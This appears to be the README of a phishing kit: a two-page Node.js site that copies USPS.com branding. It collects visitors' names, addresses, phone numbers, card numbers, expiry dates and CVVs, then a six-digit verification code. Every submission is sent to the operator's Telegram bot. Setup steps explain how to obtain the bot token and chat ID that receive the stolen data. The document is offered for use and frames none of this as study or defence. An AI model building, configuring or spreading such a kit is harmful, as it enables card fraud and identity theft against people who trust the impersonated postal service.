# USPS Style 2-Page Website

A 2-page Node.js website styled like USPS.com with Telegram Bot integration.

## Features

### Page 1 (Home - `/`)
- **"Hello"** heading in **RED** (USPS red)
- Personal Information fields:
  1. First Name
  2. Last Name
  3. Address
  4. State (dropdown with all 50 states)
  5. ZIP Code
  6. Phone Number
- **"Billing Details"** heading in **BLACK**
  1. Card Number (auto-formatted)
  2. Expiration Date (MM/YY auto-formatted)
  3. CVV
- **Submit Button** → sends all data to Telegram Bot

### Page 2 (Verify - `/verify`)
- **"Hello"** heading in RED
- 6-Digit Verification Code field
- **Submit Button** → sends code to Telegram Bot

### Success Page
- Confirmation message after verification

## Setup Instructions

### 1. Install Dependencies
```bash
cd usps-style-website
npm install
```

### 2. Configure Telegram Bot

1. Open Telegram and search for **@BotFather**
2. Start a chat and type `/newbot`
3. Follow the prompts to create your bot and get a **Bot Token**
4. Open your new bot in Telegram and send any message (e.g., "Hi")
5. Visit this URL in your browser (replace `YOUR_TOKEN`):
   ```
   https://api.telegram.org/botYOUR_TOKEN/getUpdates
   ```
6. Look for `"chat":{"id":123456789` — that number is your **Chat ID**

### 3. Update server.js

Open `server.js` and replace:
```javascript
const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = 'YOUR_CHAT_ID_HERE';
```

With your actual values.

### 4. Run the Server
```bash
npm start
```

### 5. Open in Browser
```
http://localhost:3000
```

## Project Structure
```
usps-style-website/
├── server.js              # Express server + Telegram integration
├── package.json           # Dependencies
├── public/
│   ├── css/
│   │   └── style.css      # USPS.com style CSS
│   └── js/
│       ├── main.js        # Page 1 form validation
│       └── verify.js      # Page 2 code validation
└── README.md
```

## Design Style (USPS.com)
- **Primary Blue:** `#005EA6`
- **USPS Red:** `#E71921`
- **Clean white backgrounds**
- **Blue navigation bar**
- **Professional form layout**
- **Responsive design**

## Data Flow
```
User fills form → Submit → Data sent to Telegram Bot → Redirect to Verify Page
User enters code → Submit → Code sent to Telegram Bot → Success Page
```
